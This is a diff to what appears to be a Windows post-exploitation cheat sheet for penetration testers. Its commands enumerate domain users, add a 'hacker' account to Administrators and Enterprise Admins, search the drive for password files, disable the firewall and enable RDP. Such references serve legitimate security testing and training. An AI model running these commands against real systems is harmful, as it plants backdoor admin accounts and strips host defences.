@@ -77,13 +77,14 @@ net localgroup Administrators /domain         # Users in the domain Administrato
 net localgroup "Remote Desktop Users"
 net share
 net user                                      # Local users
+net user <user> <password> /add               # Add a local user
 net user /domain > users.txt                  # All users in the current user's domain (take a few to run)
 net user hacker /domain                       # Info on domain user
 net view                                      # Computers in the users domain and other domains
 net view /domain                              # Computers in other domain
 
-net user hacker password /add
-net localgroup administrators /add hacker
+net user hacker abc123 /add
+net localgroup Administrators hacker /add
 
 net user hacker password /add /domain
 net group "Enterprise Admins" hacker /add /domain
@@ -131,13 +132,13 @@ tasklist /m
 tasklist /svc
 tasklist /v
 
-dir c:\*.xls /s                               Show all Excel docs
-dir c:\*.xlsx /s                              Show all Excel docs
-dir c:\*.ppt /s                               Show all PowerPoint docs
-dir c:\*.pptx /s                              Show all PowerPoint docs
+dir c:\*.xls /s                               Show all Excel files
+dir c:\*.xlsx /s                              Show all Excel files
+dir c:\*.ppt /s                               Show all PowerPoint files
+dir c:\*.pptx /s                              Show all PowerPoint files
 dir c:\*.doc /s                               Show all Word docs
 dir c:\*.docx /s                              Show all Word docs
-dir c:\*.pdf /s                               Show all PDFs
+dir c:\*.pdf /s                               Show all PDF files
 
 dir /s /p *password*.*                        Show all filenames that include 'password'
 ------------------------------------------------------------------------------------------------------
@@ -166,8 +167,9 @@ type %WINDIR%\System32\drivers\etc\hosts
 
 # Open RDP in the firewall, start the service, and login
 
-netsh firewall add portopening TCP 3389 RDP
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+netsh firewall set opmode disable
+sc config termservice start= auto
 rdesktop -u <user> <targetIP>
 ------------------------------------------------------------------------------------------------------
 
